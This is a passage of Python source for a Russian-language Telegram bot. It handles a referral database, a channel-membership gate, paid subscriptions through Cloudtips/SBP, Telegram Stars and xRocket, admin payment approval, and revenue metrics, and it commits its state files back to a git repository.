    LOGS_CHAT_FILE.write_text(json.dumps({"chat_id": chat_id}), encoding="utf-8")
    await msg.answer(
        bq(f"<b>{NAME}</b>")
        + f"\n\n✅ Логи отправок теперь летят в: <code>{html_mod.escape(chat_id)}</code>"
        + ("\n<i>(перебит LOGS_CHAT_ID env)</i>" if not (os.getenv("LOGS_CHAT_ID") or "").strip() else ""))


@router.channel_post(F.text.startswith("/setlogs"))
async def cp_setlogs(cp: Message):
    """Write /setlogs inside the Logs channel once — the id sticks for the run."""
    chat_id = str(cp.chat.id)
    LOGS_CHAT_FILE.write_text(json.dumps({"chat_id": chat_id}), encoding="utf-8")
    persist_logs_binding(chat_id)
    await push_send_log("логи привязаны", [f"чат: <code>{chat_id}</code>"])
    log.info("logs channel bound via channel_post: %s", chat_id)


def persist_logs_binding(chat_id: str) -> None:
    """Commit logs_chat.json to the repo so the binding survives runner
    restarts (workflow needs permissions: contents: write)."""
    commit_file_to_repo("logs_chat.json", f"bind logs channel {chat_id}")


_last_commit_times: dict[str, float] = {}
_GIT_LOCK = threading.Lock()   # serialize local git ops vs Content-API pushes


def commit_file_to_repo(rel_path: str, msg: str, cooldown: float = 0) -> None:
    """Commit a working-copy file back to the repo so runner restarts keep
    it (bot-refresh.yml grants permissions: contents: write).
    cooldown=<seconds> throttles repeated commits (proxy pool races)."""
    now = time.time()
    if cooldown and now - _last_commit_times.get(rel_path, 0) < cooldown:
        return
    _last_commit_times[rel_path] = now
    def _push():
        base = Path(__file__).parent
        with _GIT_LOCK:
            try:
                subprocess.run(["git", "add", rel_path], cwd=base,
                               timeout=30, check=False)
                r = subprocess.run(
                    ["git", "-c", "user.name=arch-bot",
                     "-c", "user.email=arch@users.noreply.github.com",
                     "commit", "-m", msg],
                    cwd=base, timeout=60, check=False, capture_output=True)
                if r.returncode != 0:
                    return   # nothing to commit — file unchanged
                # Concurrent Contents-API writers keep moving main. Rebase,
                # recover from a failed rebase, then push to an explicit ref.
                for attempt in range(8):
                    pull = subprocess.run(
                        ["git", "pull", "--rebase", "origin", "main"],
                        cwd=base, timeout=90, check=False,
                        capture_output=True)
                    if pull.returncode != 0:
                        subprocess.run(["git", "rebase", "--abort"], cwd=base,
                                       timeout=30, check=False,
                                       capture_output=True)
                        subprocess.run(["git", "add", "--", rel_path], cwd=base,
                                       timeout=30, check=False,
                                       capture_output=True)
                        subprocess.run(
                            ["git", "-c", "user.name=arch-bot",
                             "-c", "user.email=arch@users.noreply.github.com",
                             "commit", "-m", msg], cwd=base, timeout=60,
                            check=False, capture_output=True)
                    p = subprocess.run(
                        ["git", "push", "origin", "HEAD:main"], cwd=base,
                        timeout=60, check=False, capture_output=True)
                    if p.returncode == 0:
                        log.info("committed %s to repo", rel_path)
                        return
                    time.sleep(1.5 * (attempt + 1))
                log.warning("commit %s: push rejected after rebase x8",
                            rel_path)
            except Exception as e:
                log.warning("commit %s failed: %s", rel_path, e)
    try:
        loop = asyncio.get_running_loop()
        loop.run_in_executor(None, _push)
    except Exception:
        _push()



# ── user database + referral system ─────────────────────
USERS_FILE = Path(__file__).parent / "users.json"
REF_BONUS = 5          # приглашённых за +1 день подписки
REF_DEEP_BONUS = 1     # бонус за реферала 2-го уровня


def load_users() -> dict:
    if USERS_FILE.exists():
        try:
            return json.loads(USERS_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}


def save_users(users: dict) -> None:
    text = json.dumps(users, ensure_ascii=False, indent=1)
    USERS_FILE.write_text(text, encoding="utf-8")
    # bindings must survive runner restarts — commit the DB back
    commit_file_to_repo("users.json", "users update", cooldown=120)
    store.push_async("users", text)


def touch_user(user) -> dict:
    """Register/update a user in DB; returns the record."""
    users = load_users()
    key = str(user.id)
    rec = users.get(key)
    first = rec is None
    if first:
        rec = {
            "id": user.id,
            "username": user.username or "",
            "name": user.full_name or "",
            "first_seen": datetime.now().isoformat(timespec="seconds"),
            "last_seen": datetime.now().isoformat(timespec="seconds"),
            "ref_by": None,
            "refs": [],
            "ref_grants": 0,
            "deep_refs": 0,
        }
        users[key] = rec
    else:
        rec["last_seen"] = datetime.now().isoformat(timespec="seconds")
        rec["username"] = user.username or rec.get("username", "")
        rec["name"] = user.full_name or rec.get("name", "")
    save_users(users)
    rec["_first"] = first
    return rec


def set_referral(invitee, referrer_id: int) -> str | None:
    """Bind invitee → referrer. Returns 'added'|'self'|'dup'|'loop'."""
    users = load_users()
    inv_key = str(invitee.id)
    ref_key = str(referrer_id)
    if inv_key == ref_key:
        return "self"
    rec = users.get(inv_key)
    if rec is None:
        rec = touch_user(invitee)
        users = load_users()
        rec = users.get(inv_key)
    if rec.get("ref_by"):
        return "dup"
    if rec.get("ref_by") == ref_key:
        return "dup"
    if ref_key in (users.get(inv_key, {}).get("refs") or []):
        return "loop"
    ref_rec = users.get(ref_key)
    if ref_rec is None:
        # referrer may not be in DB yet — create shell record
        users[ref_key] = {
            "id": referrer_id,
            "username": "", "name": "",
            "first_seen": datetime.now().isoformat(timespec="seconds"),
            "last_seen": datetime.now().isoformat(timespec="seconds"),
            "ref_by": None, "refs": [], "ref_grants": 0, "deep_refs": 0,
        }
        ref_rec = users[ref_key]
    # loop-guard: referrer's own chain already contains invitee?
    chain_root = ref_key
    hops = 0
    cur = users.get(chain_root, {})
    while cur and hops < 10:
        by = cur.get("ref_by")
        if by == inv_key:
            return "loop"
        cur = users.get(str(by), {}) if by else {}
        hops += 1
    rec["ref_by"] = referrer_id
    ref_rec.setdefault("refs", []).append(int(invitee.id))
    save_users(users)
    persist_now("users", f"ref bind {invitee.id} -> {referrer_id}")
    return "added"


def grant_ref_bonus(referrer_id: int, days: int) -> tuple[str, str]:
    """Add `days` to referrer subscription. Returns (state, until_str)."""
    subs = load_subs()
    rec = subs.setdefault(str(referrer_id), {})
    if rec.get("forever"):
        save_subs(subs)
        return "forever", "\u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
    base = rec.get("until", 0)
    start = max(base, time.time())
    rec["until"] = start + days * 86400
    save_subs(subs)
    persist_now("subs", f"ref bonus +{days}d for {referrer_id}")
    d = datetime.fromtimestamp(rec["until"]).strftime("%d.%m.%Y %H:%M")
    return "active", d


def count_valid_refs(user_id: int) -> int:
    """Refs that are currently channel-subscribed members."""
    users = load_users()
    rec = users.get(str(user_id), {})
    refs = rec.get("refs", [])
    cid = get_channel_id()
    if not cid:
        return 0
    good = 0
    for rid in refs:
        try:
            m = asyncio.get_event_loop().run_until_complete(
                botRefCtx["bot"].get_chat_member(cid, rid))
            if m.status in ("member", "administrator", "creator"):
                good += 1
        except Exception:
            continue
    return good


botRefCtx: dict = {"bot": None}


# ── required channel gate (restored) ──────────────
def get_channel_id() -> int:
    raw = os.getenv("SUB_CHANNEL_ID", "").strip()
    if raw:
        try:
            return int(raw)
        except ValueError:
            pass
    subs = load_subs()
    v = subs.get("__channel_id")
    try:
        return int(v or 0)
    except (TypeError, ValueError):
        return 0


def set_channel_id(cid: int) -> None:
    subs = load_subs()
    subs["__channel_id"] = cid
    save_subs(subs)


@router.my_chat_member()
async def on_bot_chat_member(cm, ):
    """Auto-save the private channel id once the bot is added there."""
    chat = cm.chat
    if getattr(chat, "type", "") == "channel":
        if get_channel_id() != chat.id:
            set_channel_id(chat.id)
            log.info("sub channel saved: %s (%s)", chat.id, chat.title)
        return


async def channel_gate(cb: CallbackQuery, state: FSMContext) -> bool:
    """Require membership in the private channel before any flow."""
    if user_is_admin(cb.from_user.id):
        return True
    cid = get_channel_id()
    if not cid:
        await cb.answer(
            "\U0001f512 \u041a\u0430\u043d\u0430\u043b \u043d\u0430 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0435, \u0437\u0430\u0433\u043b\u044f\u043d\u0438 \u043f\u043e\u0437\u0436\u0435",
            show_alert=True)
        return False
    ok = False
    try:
        member = await cb.bot.get_chat_member(cid, cb.from_user.id)
        ok = member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.warning("channel check failed: %s", e)
    if ok:
        return True
    caption = (
        bq(f"<b>{NAME}</b>  \u00b7  \u0434\u043e\u0441\u0442\u0443\u043f")
        + "\n\n\U0001f512 <b>\u0422\u043e\u043b\u044c\u043a\u043e \u0434\u043b\u044f \u043f\u043e\u0434\u043f\u0438\u0441\u0447\u0438\u043a\u043e\u0432 \u043a\u0430\u043d\u0430\u043b\u0430</b>:"
        + "\n\u0432\u0441\u0442\u0443\u043f\u0430\u0439 \u2014 \u0438 \u0436\u043c\u0438 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c"
    )
    rows = [
        [InlineKeyboardButton(text="Вступить в канал", icon_custom_emoji_id="5370546867786523009", url=SUB_CHANNEL_LINK)],
        [InlineKeyboardButton(text="Я подписался", icon_custom_emoji_id="5357069174512303778", callback_data="menu:launch")],
    ]
    try:
        await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                      reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except Exception:
        pass
    await state.clear()
    await cb.answer()
    return False


async def count_valid_refs_async(user_id: int) -> int:
    """Real channel memberships + manual /refgive credit (never muted)."""
    users = load_users()
    rec = users.get(str(user_id), {})
    refs = rec.get("refs", [])
    credit = rec.get("ref_credit", 0) or 0
    if not refs:
        return credit
    cid = get_channel_id()
    if not cid:
        return credit
    good = 0
    for rid in refs:
        try:
            m = await botRefCtx["bot"].get_chat_member(cid, rid)
            if m.status in ("member", "administrator", "creator"):
                good += 1
        except Exception:
            continue
    return good + credit


PAY_STATS_FILE = Path(__file__).parent / "pay_stats.json"
CUR_BY_METHOD = {"cloudtips": "\u20bd", "xrocket": "USDT", "stars": "\u2b50"}


def load_pay_stats() -> list:
    try:
        return json.loads(PAY_STATS_FILE.read_text(encoding="utf-8"))
    except Exception:
        return []


def save_pay_stats(recs: list) -> None:
    PAY_STATS_FILE.write_text(
        json.dumps(recs[-2000:], ensure_ascii=False), encoding="utf-8")


def bump_pay_stats(uid: int, plan: str, method: str,
                   amount: float, cur: str) -> None:
    recs = load_pay_stats()
    recs.append({"ts": time.time(), "uid": uid, "plan": plan,
                 "method": method, "amount": round(amount, 2), "cur": cur})
    save_pay_stats(recs)
    commit_file_to_repo("pay_stats.json", "pay stats update", cooldown=600)


def sub_quality(subs: dict, user_id: int) -> tuple[str, str]:
    """(state, until_str). state: admin|forever|active|free|expired"""
    if user_is_admin(user_id):
        return "admin", "\u0431\u0435\u0437 \u043b\u0438\u043c\u0438\u0442\u043e\u0432"
    rec = subs.get(str(user_id), {})
    if rec.get("premium") and (rec.get("forever")
                               or float(rec.get("until") or 0) > time.time()):
        until = rec.get("until") or 0
        label = ("\u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
                 if rec.get("forever") else
                 datetime.fromtimestamp(until).strftime("%d.%m.%Y %H:%M"))
        return "premium", label
    if rec.get("forever"):
        return "forever", "\u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
    until = rec.get("until", 0)
    if until and until > time.time():
        d = datetime.fromtimestamp(until).strftime("%d.%m.%Y %H:%M")
        return "active", d
    if until:
        return "expired", "\u0438\u0441\u0442\u0435\u043a\u043b\u0430"
    return "free", "\u2014"


async def sub_gate(cb: CallbackQuery, state: FSMContext) -> bool:
    """Call inside menu handlers; returns True to continue flow."""
    subs = load_subs()
    s, until = sub_quality(subs, cb.from_user.id)
    if s in ("admin", "forever", "active", "premium"):
        return True
    caption = (
        bq(f"<b>{NAME}</b>  —  Оплата")
        + f"\n\n✏ Состояние: <b>{s}</b>"
        + (f" ({until})" if until != "—" else "")
        + "\n\nДля запуска нужна подписка. Выбери способ оплаты:"
    )
    rows = [
        [InlineKeyboardButton(text="Карта РФ / СБП (₽)", icon_custom_emoji_id="5258204546391351475", callback_data="sub:pm:ct")],
        [InlineKeyboardButton(text="Telegram Stars", icon_custom_emoji_id="5258165702707125574", callback_data="sub:pm:xtr")],
        [InlineKeyboardButton(text="xRocket (USDT)", icon_custom_emoji_id="5323404142809467476", callback_data="sub:pm:xr")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
    ]
    await state.clear()
    try:
        await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                      reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except Exception:
        pass
    await cb.answer()
    return False


def activate_plan(subs: dict, user_id: int, plan_key: str) -> dict:
    pl = SUB_PLANS.get(plan_key)
    if pl is None:
        log.warning("activate_plan: unknown plan %s — ignored", plan_key)
        return subs.setdefault(str(user_id), {})
    # для юзеров из _PREM_REQUIRES_BASE премиум только как дополнение
    if plan_key == "prem" and user_id in _PREM_REQUIRES_BASE:
        if not _has_base_sub(subs, user_id):
            raise ValueError("premium_requires_base")
    rec = subs.setdefault(str(user_id), {})
    if plan_key == "prem":
        rec["premium"] = True
    if pl["days"] is None:
        rec["forever"] = True
    else:
        base = rec.get("until", 0)
        start = max(base, time.time())
        rec["until"] = start + pl["days"] * 86400
    save_subs(subs)
    persist_now("subs", f"subs paid: plan {plan_key} for {user_id}")
    return rec


# ── subscriptions UI ────────────────────────────────────
@router.callback_query(F.data == "sub:shop")
async def sub_shop(cb: CallbackQuery, state: FSMContext):
    subs = load_subs()
    s, until = sub_quality(subs, cb.from_user.id)
    caption = (
        bq(f"<b>{NAME}</b>  —  Оплата")
        + f"\n\n✏ Состояние: <b>{s}</b>"
        + (f" ({until})" if until != "—" else "")
        + "\n\nВыбери способ оплаты:"
    )
    rows = [
        [InlineKeyboardButton(text="Карта РФ / СБП (₽)", icon_custom_emoji_id="5258204546391351475", callback_data="sub:pm:ct")],
        [InlineKeyboardButton(text="Telegram Stars", icon_custom_emoji_id="5258165702707125574", callback_data="sub:pm:xtr")],
        [InlineKeyboardButton(text="xRocket (USDT)", icon_custom_emoji_id="5323404142809467476", callback_data="sub:pm:xr")],
        [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
    ]
    await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                  reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await cb.answer()


def _pilot_only(cb: CallbackQuery) -> bool:
    """PAY_METHODS_ADMIN=None → методы открыты всем; иначе пилот одного id."""
    return (PAY_METHODS_ADMIN is not None
            and cb.from_user.id != PAY_METHODS_ADMIN)


@router.callback_query(F.data.startswith("sub:pm:"))
async def sub_paymethod(cb: CallbackQuery, state: FSMContext):
    if _pilot_only(cb):
        await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
        return
    m = cb.data.rsplit(":", 1)[1]
    _plans = _visible_plans(cb.from_user.id, load_subs())
    _prem_hidden = cb.from_user.id in _PREM_REQUIRES_BASE and \
                   not _has_base_sub(load_subs(), cb.from_user.id)
    _prem_note = ("\n\n⚠️ <i>Премиум доступен только при активной базовой подписке.</i>"
                  if _prem_hidden else "")
    if m == "xtr":
        caption = (
            bq(f"<b>{NAME}</b>  —  ⭐ Telegram Stars")
            + "\n\nТарифы:"
        )
        for pk, pl in _plans:
            caption += f"\n• <b>{pl['label']}</b> — <b>{STARS_PRICES[pk]} ⭐</b>"
        caption += _prem_note
        rows = []
        for pk, pl in _plans:
            link = await arch_star_link(pk, cb.from_user.id)
            rows.append([InlineKeyboardButton(
                text=f"⭐ {pl['label']} — {STARS_PRICES[pk]}",
                url=link or f"https://t.me/{ARCH_BOT_USERNAME}?start=buy_xtr_{pk}")])
    elif m == "ct":
        caption = (
            bq(f"<b>{NAME}</b>  —  💳 Карта РФ / СБП")
            + "\n\nОплата рублями через Cloudtips: карта любого банка РФ или СБП.\nТарифы:"
        )
        for pk, pl in _plans:
            caption += f"\n• <b>{pl['label']}</b> — <b>{ct_price_rub(pk):.0f} ₽</b>"
        caption += _prem_note
        rows = [[InlineKeyboardButton(
                    text=f"💰 {pl['label']} — {ct_price_rub(pk):.0f} ₽",
                    callback_data=f"sub:buy:ct:{pk}")]
                for pk, pl in _plans]
    else:
        caption = (
            bq(f"<b>{NAME}</b>  —  🚀 xRocket")
            + "\n\nИнвойс в USDT через @xrocket.\nТарифы:"
        )
        for pk, pl in _plans:
            caption += f"\n• <b>{pl['label']}</b> — <b>{pl['price']:g} USDT</b>"
        caption += _prem_note
        rows = [[InlineKeyboardButton(
                    text=f"💰 {pl['label']} — {pl['price']:g} USDT",
                    callback_data=f"sub:buy:xrocket:{pk}")]
                for pk, pl in _plans]
    rows.append([InlineKeyboardButton(text="К способам", icon_custom_emoji_id="5258132936401624790", callback_data="sub:shop")])
    await cb.message.edit_caption(caption=_cx(caption), parse_mode=ParseMode.HTML,
                                  reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await cb.answer()


@router.callback_query(F.data.startswith("sub:buy:"))
async def sub_buy(cb: CallbackQuery, state: FSMContext):
    parts = cb.data.split(":")          # sub:buy:<method>:<plan> | sub:buy:<plan>
    pk = parts[-1]
    method = parts[2] if len(parts) == 4 else "xrocket"
    pl = SUB_PLANS.get(pk)
    if not pl:
        await cb.answer("❌", show_alert=True)
        return

    if method == "xtr":
        # stars now collect on the cashier bot — point the user there
        await cb.answer(f"⭐ Оплата звёздами идёт в @{ARCH_BOT_USERNAME}",
                        show_alert=True)
        return

    if method == "ct":
        if _pilot_only(cb):
            await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
            return
        uid = cb.from_user.id
        # anti-abuse: one open invoice per user + purchase cooldown
        _pend_chk = load_ct_pending()
        if str(uid) in _pend_chk:
            await cb.answer("У тебя уже висит неоплаченный счёт — "
                            "оплати или жми «Я оплатил».", show_alert=True)
            return
        _ago = time.time() - _ct_buy_times.get(uid, 0)
        if _ago < 60:
            await cb.answer(f"Слишком часто — подожди {int(60 - _ago)} сек.",
                            show_alert=True)
            return
        _ct_buy_times[uid] = time.time()
        amount = ct_amount(uid, pk)
        pay_url = f"{CLOUDTIPS_PAGE}?amount={amount}"
        try:
            sbp_txn, sbp_id, sbp_url = await ct_sbp_create(float(amount))
        except Exception as e:
            log.error("ct sbp on buy: %s", e)
            sbp_txn, sbp_id, sbp_url = None, None, None
        pend = load_ct_pending()
        pend[str(uid)] = {"plan": pk, "amount": amount, "ts": time.time()}
        if sbp_txn:
            pend[str(uid)]["sbp_txn"] = sbp_txn
            pend[str(uid)]["sbp_id"] = sbp_id
            pend[str(uid)]["sbp_url"] = sbp_url
        save_ct_pending(pend)
        try:
            _b = await ct_fetch_balance()
            if _b is not None:
                pend[str(uid)]["base"] = _b
                save_ct_pending(pend)
        except Exception:
            pass
        price_r = f"{ct_price_rub(pk):.0f}"
        caption = (
            bq(f"<b>{NAME}</b>  —  💳 Оплата Cloudtips")
            + f"\n\n💳 <b>{pl['label']}</b> — <b>{price_r} ₽</b>"
            + f"\n🧾 Сумма к оплате: <b>{amount} ₽</b>\n\n"
            + "Подписка включится <b>автоматически</b>."
        )
        if sbp_url:
            pay_btn = [InlineKeyboardButton(
                text=f"Оплатить через СБП {amount} ₽",
                icon_custom_emoji_id="5258204546391351475",
                url=sbp_url)]
        else:
            pay_btn = [InlineKeyboardButton(
                text=f"Оплатить {amount} ₽",
                icon_custom_emoji_id="5258204546391351475",
                url=pay_url)]
        rows = [pay_btn,
                [InlineKeyboardButton(
                    text="Я оплатил",
                    icon_custom_emoji_id="5357069174512303778",
                    callback_data=f"sub:ctpaid:{pk}")],
                [InlineKeyboardButton(
                    text="Назад",
                    icon_custom_emoji_id="5258132936401624790",
                    callback_data="sub:pm:ct")]]
        await cb.message.edit_caption(
            caption=_cx(caption), parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        )
        await cb.answer()
        return

    # ── xrocket (USDT, everyone) ──
    if not XROCKET_TOKEN:
        await cb.answer("Оплата не настроена (XROCKET_TOKEN)", show_alert=True)
        return
    payload = {"kind": "sub", "plan": pk, "tgId": str(cb.from_user.id)}
    try:
        j = await xrocket_create_invoice(pl["price"], payload,
                                         f"{NAME} subscription {pl['label']}")
    except Exception as e:
        log.error("xrocket invoice failed: %s", e)
        await cb.answer("❌ Сервис оплаты недоступен", show_alert=True)
        return
    inv_id = j.get("id")
    pay_url = (j.get("links") or {}).get("telegramBotLink")
    if not inv_id or not pay_url:
        log.error("xrocket bad invoice: %s", j)
        await cb.answer("❌ Инвойс не создан", show_alert=True)
        return
    data = await state.get_data()
    pend = data.get("pend", {})
    pend[str(inv_id)] = {"user": cb.from_user.id, "plan": pk, "ts": time.time(),
                         "method": "xrocket"}
    await state.update_data(pend=pend)
    price_s = f"{pl['price']:g}"
    caption = (
        bq(f"<b>{NAME}</b>  —  Оплата")
        + f"\n\n💳 <b>{pl['label']}</b> — <b>{price_s} USDT</b>"
        + f"\n🧾 <b>Invoice:</b> <code>{inv_id}</code>\n\n"
        + "Оплати в @xrocket по кнопке,\nзатем вернись и нажми <b>🔍 Проверить</b>."
    )
    await cb.message.edit_caption(
        caption=_cx(caption), parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Оплатить", icon_custom_emoji_id="5258204546391351475", url=pay_url)],
            [InlineKeyboardButton(text="Проверить", icon_custom_emoji_id="5429571366384842791", callback_data=f"sub:check:{inv_id}")],
            [InlineKeyboardButton(text="Назад", icon_custom_emoji_id="5258132936401624790", callback_data="sub:pm:xr")],
        ]),
    )
    await cb.answer()


@router.callback_query(F.data.startswith("sub:ctpaid:"))
async def sub_ct_paid(cb: CallbackQuery, state: FSMContext):
    """Buyer pressed 'I paid' → poll now; auto-confirm or wait."""
    pk = cb.data.rsplit(":", 1)[1]
    if pk not in SUB_PLANS:
        await cb.answer("❌", show_alert=True)
        return
    uid = cb.from_user.id
    try:
        await ct_poll_once(cb.bot)
    except Exception as e:
        log.error("ct paid poll: %s", e)
    pend = load_ct_pending()
    rec = pend.get(str(uid))
    _stale = (rec and rec.get("sbp_txn")
              and time.time() - rec.get("ts", 0) > 600)
    if rec and (not rec.get("sbp_txn") or _stale):
        try:
            _txn, _sid, _url = await ct_sbp_create(
                float(rec.get("amount", 0)))
        except Exception as e:
            log.error("ct sbp regen: %s", e)
            _txn, _sid, _url = None, None, None
        if _txn:
            rec["sbp_txn"] = _txn
            rec["sbp_id"] = _sid
            rec["sbp_url"] = _url
            rec["ts"] = time.time()
            rec.pop("alerted", None)
            save_ct_pending(pend)
            try:
                rows = [[InlineKeyboardButton(
                            text=b.text,
                            icon_custom_emoji_id=b.icon_custom_emoji_id,
                            url=b.url,
                            callback_data=b.callback_data)
                        for b in _r]
                        for _r in
                        cb.message.reply_markup.inline_keyboard]
                _upd = False
                for _r in rows:
                    for _b in _r:
                        if (_b.url or "").startswith("https://qr.nspk.ru"):
                            _b.url = _url
                            _upd = True
                if not _upd:
                    _idx = 0
                    for _i, _r in enumerate(rows):
                        if any((b.callback_data or "").startswith(
                                "sub:ctpaid") for b in _r):
                            _idx = _i
                            break
                    rows.insert(_idx, [InlineKeyboardButton(
                        text=f"Оплатить через СБП {rec.get('amount')} ₽",
                        icon_custom_emoji_id="5258204546391351475",
                        url=_url)])
                await cb.message.edit_reply_markup(
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
            except Exception as e:
                log.error("ct sbp rekb: %s", e)
            await cb.answer("Свежая СБП-ссылка — жми кнопку оплаты.",
                            show_alert=True)
            return
    if str(uid) not in pend:
        subs = load_subs()
        s, until = sub_quality(subs, uid)
        try:
            await cb.message.edit_caption(
                caption=_cx(bq(f"<b>{NAME}</b> — оплата подтверждена ✅")
                            + f"\n\n✅ Подписка: <b>{s}</b> ({until})"
                            + "\nМожно пользоваться!"),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await cb.answer("Оплата найдена — подписка активна ✅")
        return
    await cb.answer("Платёж пока не дошёл — включу автоматически, "
                    "как только придёт (проверка каждые 45 сек).",
                    show_alert=True)


def telemetry_text() -> str:
    """Shared metrics text for /stats and the Telemetry button."""
    recs = load_pay_stats()
    now = time.time()

    def _rev(window: float):
        rows = [r for r in recs if now - r.get("ts", 0) < window]
        out = {}
        for r in rows:
            m = r.get("method", "?")
            amt, cnt = out.get(m, (0.0, 0))
            out[m] = (amt + float(r.get("amount", 0)), cnt + 1)
        return out, len(rows)

    d24, n24 = _rev(86400)
    d7, n7 = _rev(7 * 86400)
    dall, nall = _rev(10 ** 9)

    def _fmt(d: dict) -> str:
        if not d:
            return "\u2014"
        return " | ".join(
            f"{k}: {v[0]:g} {CUR_BY_METHOD.get(k, '')} \u00d7{v[1]}"
            for k, v in sorted(d.items()))

    subs = load_subs()
    active = sum(1 for v in subs.values()
                 if v.get("forever") or v.get("until", 0) > now)
    users = load_users()
    payers = len({r.get("uid") for r in recs})
    conv = (payers / len(users) * 100) if users else 0
    return (bq(f"\U0001f4ca <b>{NAME}</b> \u2014 \u043c\u0435\u0442\u0440\u0438\u043a\u0438")
            + "\n\n<b>24\u0447</b>: " + _fmt(d24)
            + f" (\u043f\u043b\u0430\u0442\u0435\u0436\u0435\u0439 {n24})"
            + "\n<b>7\u0434</b>: " + _fmt(d7)
            + f" (\u043f\u043b\u0430\u0442\u0435\u0436\u0435\u0439 {n7})"
            + "\n<b>\u0432\u0441\u0451 \u0432\u0440\u0435\u043c\u044f</b>: " + _fmt(dall)
            + f" (\u043f\u043b\u0430\u0442\u0435\u0436\u0435\u0439 {nall})"
            + f"\n\n\U0001f464 \u042e\u0437\u0435\u0440\u043e\u0432: <b>{len(users)}</b>"
            + f" | \u041f\u043b\u0430\u0442\u0438\u043b\u0438: <b>{payers}</b> ({conv:.1f}%)"
            + f" | \u0410\u043a\u0442\u0438\u0432\u043d\u044b\u0445 \u043f\u043e\u0434\u043f\u0438\u0441\u043e\u043a: <b>{active}</b>")


@router.message(Command("stats"))
async def cmd_stats(msg: Message):
    """Admin: revenue by method, payers, conversion, active subs."""
    if not ADMIN_ID or msg.from_user.id != int(ADMIN_ID):
        return
    await msg.answer(_cx(telemetry_text()), parse_mode=ParseMode.HTML)


@router.callback_query(F.data == "menu:telemetry")
async def menu_telemetry(cb: CallbackQuery):
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer()
        return
    await cb.answer()
    try:
        await cb.message.edit_caption(
            caption=_cx(telemetry_text()), parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                InlineKeyboardButton(
                    text="\u041d\u0430\u0437\u0430\u0434",
                    icon_custom_emoji_id="5258132936401624790",
                    callback_data="back:home")]]))
    except Exception as e:
        log.warning("telemetry render failed: %s", e)


@router.callback_query(F.data.startswith("sub:ctok:"))
async def sub_ct_ok(cb: CallbackQuery, state: FSMContext):
    """Admin approves cloudtips payment → activate plan."""
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer("⛔️", show_alert=True)
        return
    _, _, uid_s, pk = cb.data.split(":")
    pk = plan_key(pk)
    if pk not in SUB_PLANS:
        await cb.answer("❌", show_alert=True)
        return
    uid = int(uid_s)
    subs = load_subs()
    try:
        activate_plan(subs, uid, pk)
    except ValueError as ve:
        if "premium_requires_base" in str(ve):
            await cb.answer("❌ Нельзя: сначала нужна базовая подписка", show_alert=True)
            return
        raise
    pend = load_ct_pending()
    _rec_amt = float((pend.get(str(uid)) or {}).get("amount", 0))
    bump_pay_stats(uid, pk, "cloudtips", _rec_amt, "RUB")
    pend.pop(str(uid), None)
    save_ct_pending(pend)
    s, until = sub_quality(subs, uid)
    try:
        await cb.bot.send_message(
            uid,
            _cx(bq(f"<b>{NAME}</b> — оплата подтверждена ✅")
                + f"\n\n✅ Подписка: <b>{s}</b> ({until})\nМожно пользоваться!"),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await push_send_log(
        "Оплата (Cloudtips)",
        [f"✅ <code>{uid}</code> — план <b>{pk}</b> выдан"])
    await cb.message.edit_text(_cx(f"✅ Выдано: план <b>{pk}</b> → <code>{uid}</code>"),
                               parse_mode=ParseMode.HTML)
    await cb.answer()


@router.callback_query(F.data.startswith("sub:ctno:"))
async def sub_ct_no(cb: CallbackQuery, state: FSMContext):
    """Admin rejects cloudtips claim."""
    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
        await cb.answer("⛔️", show_alert=True)
        return
    _, _, uid_s, pk = cb.data.split(":")
    uid = int(uid_s)
    pend = load_ct_pending()
    pend.pop(str(uid), None)
    save_ct_pending(pend)
    await push_send_log(
        "Заявка Cloudtips",
        [f"❌ отказ: <code>{uid}</code> — план {pk}"])
    await cb.message.edit_text(_cx(f"❌ Отклонено: <code>{uid}</code> ({pk})"),
                               parse_mode=ParseMode.HTML)
    await cb.answer()


@router.callback_query(F.data.startswith("sub:cc:"))
async def sub_cryptobot_check(cb: CallbackQuery, state: FSMContext):
    """sub:cc:<invoice_id>:<plan> — poll CryptoBot invoice status."""
    if _pilot_only(cb):
        await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
        return
    parts = cb.data.split(":")
    inv_id, pk = parts[2], parts[3]
    pk = plan_key(pk)
    if not SUB_PLANS.get(pk):
        await cb.answer("❌", show_alert=True)
        return
    try:
        res = await cryptobot_api("getInvoices", {"invoice_ids": inv_id})
    except Exception as e:
        log.error("cryptobot status failed: %s", e)
        await cb.answer("❌ Сервис оплаты недоступен", show_alert=True)
        return
    items = res.get("items") or []
    status = (items[0].get("status") or "") if items else ""
    if status == "paid":
        subs = load_subs()
        try:
            activate_plan(subs, cb.from_user.id, pk)
        except ValueError as ve:
            if "premium_requires_base" in str(ve):
                await cb.answer(
                    "❌ Сначала нужна базовая подписка — потом премиум",
                    show_alert=True)
                return
            raise
        s, until = sub_quality(subs, cb.from_user.id)
